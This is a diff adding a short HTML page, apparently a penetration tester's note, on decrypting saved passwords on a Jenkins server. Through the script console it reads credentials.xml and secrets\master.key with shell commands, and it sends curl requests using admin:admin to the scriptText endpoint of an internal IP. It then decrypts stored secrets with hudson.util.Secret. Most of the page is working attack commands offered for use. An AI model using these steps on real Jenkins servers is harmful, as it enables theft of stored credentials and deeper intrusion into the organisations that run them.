@@ -1,0 +1,51 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Decrypting credentials.xml</title>
+</head><body><b>If you find yourself on a Jenkins box with script consol</b>e access you can decrypt the saved passwords in credentials.xml in the following way:<br/>
+<br/>
+hashed_pw='$PASSWORDHASH'<br/>
+passwd = hudson.util.Secret.decrypt(hashed_pw)<br/>
+println(passwd)<br/>
+<br/>
+You need to perform this on the the Jenkins system itself as it's using the local <i>master.key</i>&nbsp;and <i>hudson.util.Secret</i><br/>
+<br/>
+<br/>
+<b>Code to get the credentials.xml from the script console</b><br/>
+Windows<br/>
+def sout = new StringBuffer(), serr = new StringBuffer()<br/>
+def proc = 'cmd.exe /c type credentials.xml'.execute()<br/>
+proc.consumeProcessOutput(sout, serr)<br/>
+proc.waitForOrKill(1000)<br/>
+println "out&gt; $sout err&gt; $serr"<br/>
+<br/>
+*nix<br/>
+def sout = new StringBuffer(), serr = new StringBuffer()<br/>
+def proc = 'cat credentials.xml'.execute()<br/>
+proc.consumeProcessOutput(sout, serr)<br/>
+proc.waitForOrKill(1000)<br/>
+println "out&gt; $sout err&gt; $serr"<br/>
+<br/>
+<br/>
+<b>If you just want to do it with curl you can hit the scriptText endpoint</b>&nbsp;and do something like this:<br/>
+Windows:<br/>
+curl -u admin:admin http://10.0.0.160:8080/scriptText --data "script=def+sout+%3D+new StringBuffer(),serr = new StringBuffer()%0D%0Adef+proc+%3D+%27cmd.exe+/c+type+credentials.xml%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%3E+%24sout+err%3E+%24serr%22&amp;Submit=Run"<br/>
+<br/>
+Also because this syntax took me a minute to figure out for files in subdirectories:<br/>
+<br/>
+curl -u admin:admin http://10.0.0.160:8080/scriptText --data "script=def+sout+%3D+new StringBuffer(),serr = new StringBuffer()%0D%0Adef+proc+%3D+%27cmd.exe+/c+type+secrets%5C\master.key%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%3E+%24sout+err%3E+%24serr%22&amp;Submit=Run<br/>
+<br/>
+*nix<br/>
+curl -u admin:admin http://10.0.0.160:8080/scriptText --data "script=def+sout+%3D+new StringBuffer(),serr = new StringBuffer()%0D%0Adef+proc+%3D+%27cat+credentials.xml%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%3E+%24sout+err%3E+%24serr%22&amp;Submit=Run"<br/>
+<br/>
+<br/>
+Then to decrypt any passwords:<br/>
+curl -u admin:admin http://10.0.0.160:8080/scriptText --data "script=println(hudson.util.Secret.fromString('7pXrOOFP1XG62UsWyeeSI1m06YaOFI3s26WVkOsTUx0=').getPlainText())"<br/>
+<br/>
+<br/>
+<b>If you are in a position where you have the files but no access to jenkins</b>&nbsp;you can use:<br/>
+[Jenkins-Decrypt](https://github.com/tweksteen/jenkins-decrypt) | <br/>
+Can read more here: http://thiébaud.fr/jenkins_credentials.html<br/>
+<br/>
+There is a small bug in the python when it does the regex and i havent bothered to fix it at the time of this post. But here is version where instead of the regex i'm just printing out the values and you can see the decrypted password. The change is line 55.</body></html>
